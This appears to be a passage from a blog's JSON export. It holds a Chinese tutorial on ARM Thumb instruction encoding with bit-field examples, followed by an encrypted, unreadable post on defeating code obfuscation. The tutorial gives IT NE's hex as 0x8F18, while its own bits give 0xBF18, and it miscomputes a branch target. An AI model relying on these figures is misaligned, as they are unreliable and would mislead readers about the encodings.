thumb指令编码和arm指令类似，thumb指令集作为arm指令集的一个子集，它具有16位的指令宽度，与arm指令的32位宽度想必，thumb指令集保留了32位宽度的优势下节省了系统的储存空间。 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 opcode thumb常见的指令编码 有了上面的指令表，就可以对一个具体的指令进行分析了。 下面以实际的指令例子分析： mov 根据上面可得其位域分布如下 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 0 1 0 op Ld/Ln Immed8 分析如下汇编代码 MOVS R3, #0 上面的的thumb指令对应16 进制为0x2300，对应的位域分布如下 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 0 1 0 0 0 1 1 0 0 0 0 0 0 0 011对应R3寄存器，立即数为0，与我们分析得一致 b 分支指令对应的位域分布如下| 15 14 13 12 | 11 | 10 9 8 7 6 5 4 3 2 1 || ———– | —- | ——————– || 1 1 1 0 | 0 | singed 11bit offset | 这里的偏移计算公式如下： B ins_address+4+offset*2 假设有如下指令：0xE7FF，其当前地址为0xBE86，所以offset为0x7ff，由于7ff对应的有符号数为-1 所以跳转到地址为：0xBE86+(-1)*2=0xBE88，也可以解释为跳转到下一条指令。 it 由于thumb指令只有16位长，所以需要一条条件执行指令即IT，这条指令并没有出现在上面之中，下面解释一下该指令，这条指令最多可以条件执行4条指令，第一条指令默认是If。 现在有IT NE指令对应的16进制为0x8F18| 15 14 13 12 | 11 10 9 8 | 7 6 5 4 | 3 | 2 1 0 || ———– | ——— | ——- | —- | ——- || 1 0 1 1 | 1 1 1 1 | cond | 1 | If/else | 根据上面格式可知，4-7位为条件值，0-3位位需要条件指令的指令情况。 条件值对应表如下 0x8F18对应的二进制如下 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 1 0 1 1 1 1 1 1 0 0 0 1 1 0 0 0 所以条件为0001=NE，条件执行=000，即只有下一条指令需要条件执行，所以该指令为IT NE 参考 https://alisdair.mcdiarmid.org/arm-immediate-value-encoding/ http://engold.ui.ac.ir/~nikmehr/Appendix_B2.pdf 指令对应表 http://armconverter.com/ 在线转换 http://hermes.wings.cs.wisc.edu/files/Thumb-2SupplementReferenceManual.pdf http://www.binaryconvert.com/convert_signed_short.html 二进制位查看","tags":[{"name":"arm","slug":"arm","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"}]},{"title":"符号执行解决代码混淆实践","date":"2019-04-15T06:42:12.000Z","path":"2019/04/15/antiOLLVM/antiOLLVM/","text":"Need password to decrypt! Incorrect Password! No content to display! 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